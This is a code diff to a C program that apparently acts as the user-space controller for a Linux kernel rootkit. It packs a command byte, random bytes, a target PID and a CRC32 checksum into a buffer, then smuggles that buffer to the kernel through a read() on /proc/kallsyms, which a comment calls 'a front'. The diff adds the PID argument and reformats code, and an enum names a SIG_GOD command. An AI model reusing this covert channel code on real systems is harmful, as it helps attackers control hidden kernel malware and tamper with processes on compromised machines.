@@ -7,8 +7,7 @@
 #include <string.h>
 #include <time.h>
 #include <unistd.h>
-
-#define CMD 0xFF // Sample command
+#include <sys/types.h>
 
 typedef enum {
   SIG_GOD = 0xFF,
@@ -74,70 +73,101 @@ uint32_t crc32(const void *buf, size_t size) {
 
     crc = ~0U;
     while (size--)
-    crc = crc32_tab[(crc ^ *p++) & 0xFF] ^ (crc >> 8);
+        crc = crc32_tab[(crc ^ *p++) & 0xFF] ^ (crc >> 8);
     return crc ^ ~0U;
 }
 
 void append_rand_bytes(char *buffer, size_t size) {
-    for (size_t i = 0; i < size; i++) {
+  for (size_t i = 0; i < size; i++) {
     buffer[i] = rand() & 0xFF;
-    }
+  }
 }
 
 void append_crc(char *buffer, size_t size) {
-    uint32_t crc;
-
-    crc = htole32(crc32(buffer, size));
-    memcpy(buffer + size, &crc, sizeof(crc));
+  uint32_t crc = htole32(crc32(buffer, size));
+  memcpy(buffer + size, &crc, sizeof(crc));
 }
 
-void print_buf(const char buffer[]) {
-    printf("=> Constructed command: ");
-    for (size_t i=0; i<9; i++) {
+void append_pid(char *buffer, pid_t pid, size_t offset) {
+  pid_t pid_le = htole32(pid);
+  memcpy(buffer + offset, &pid_le, sizeof(pid_t));
+}
+
+void print_buf(const char buffer[], size_t size) {
+  printf("=> Constructed command: ");
+  for (size_t i = 0; i < size; i++) {
     printf("%02X", (unsigned char)buffer[i]);
-    }
-    printf("\n");
+  }
+  printf("\n");
 }
 
-int main(int argc, char* argv[]) {
-    size_t data_size = 1 + 4; // CMD + 4 RAND BYTES
-    ssize_t error;
+int main(int argc, char *argv[]) {
+  if (argc < 3) {
+    fprintf(stderr, "Usage: %s <CMD> <PID>\n", argv[0]);
+    return 1;
+  }
 
-    uint32_t crc;
-    char cmd;
-    
-    int fd;
+  size_t rand_bytes_size = 4; // Number of random bytes
+  size_t pid_size = sizeof(pid_t);
+  size_t crc_size = sizeof(uint32_t);
 
-    char buffer[1024] = {0};
-    size_t buf_size = sizeof(buffer);
-    char *endptr;
-    
-    srand(time(NULL));
-    printf("-> Seeded PRNG\n");
+  // Total size: 1 (cmd) + 4 (random bytes) + sizeof(pid_t) + sizeof(uint32_t)
+  // (CRC)
+  size_t data_size = 1 + rand_bytes_size + pid_size + crc_size;
+  ssize_t error;
 
-    cmd = (char)strtol(argv[1], NULL, 16);
-    // Construct buffer
-    buffer[0] = cmd;      // initial byte (cmd)
-    append_rand_bytes(buffer + 1, 4); // append 4 random bytes after the cmd
-    append_crc(buffer, data_size);    // append crc checksum (in little endian)
+  uint32_t crc;
+  uint8_t cmd;
+  int fd;
+  pid_t pid;
 
-    print_buf(buffer);
+  char buffer[1024] = {0};
+  size_t buf_size = sizeof(buffer);
 
-    fd = open("/proc/kallsyms", O_RDONLY);
-    if (fd < 0) {
-        fprintf(stderr, "Error opening file: %s\n", strerror(errno));
-        return 1;
-    }
-    printf("-> Opened fd to /proc/kallsyms\n");
+  srand(time(NULL));
+  printf("-> Seeded PRNG\n");
 
-    // Send command to the kernel using a read() as a front
-    error = read(fd, buffer, buf_size);
-    if (error < 0) {
-        fprintf(stderr, "Error reading file: %s\n", strerror(errno));
-        close(fd);
-        return 1;
-    }
+  // Parse command and PID arguments
+  cmd = (uint8_t)strtol(argv[1], NULL, 16);
+  if (errno == ERANGE) {
+    fprintf(stderr, "Invalid CMD value: %s\n", argv[1]);
+    return 1;
+  }
 
+  pid = (pid_t)strtol(argv[2], NULL, 10);
+  if (errno == ERANGE) {
+    fprintf(stderr, "Invalid PID value: %s\n", argv[2]);
+    return 1;
+  }
+
+  // Construct buffer
+  buffer[0] = cmd;                                // initial byte (cmd)
+  append_rand_bytes(buffer + 1, rand_bytes_size); // append 4 random bytes
+
+  // Calculate position to insert PID
+  size_t pid_offset = 1 + rand_bytes_size;
+  append_pid(buffer, pid, pid_offset);
+
+  // Calculate CRC for the part of buffer before the CRC
+  append_crc(buffer, pid_offset + pid_size);
+
+  print_buf(buffer, data_size);
+
+  fd = open("/proc/kallsyms", O_RDONLY);
+  if (fd < 0) {
+    fprintf(stderr, "Error opening file: %s\n", strerror(errno));
+    return 1;
+  }
+  printf("-> Opened fd to /proc/kallsyms\n");
+
+  // Send command to the kernel using a read() as a front
+  error = read(fd, buffer, buf_size);
+  if (error < 0) {
+    fprintf(stderr, "Error reading file: %s\n", strerror(errno));
     close(fd);
-    return 0;
+    return 1;
+  }
+
+  close(fd);
+  return 0;
 }
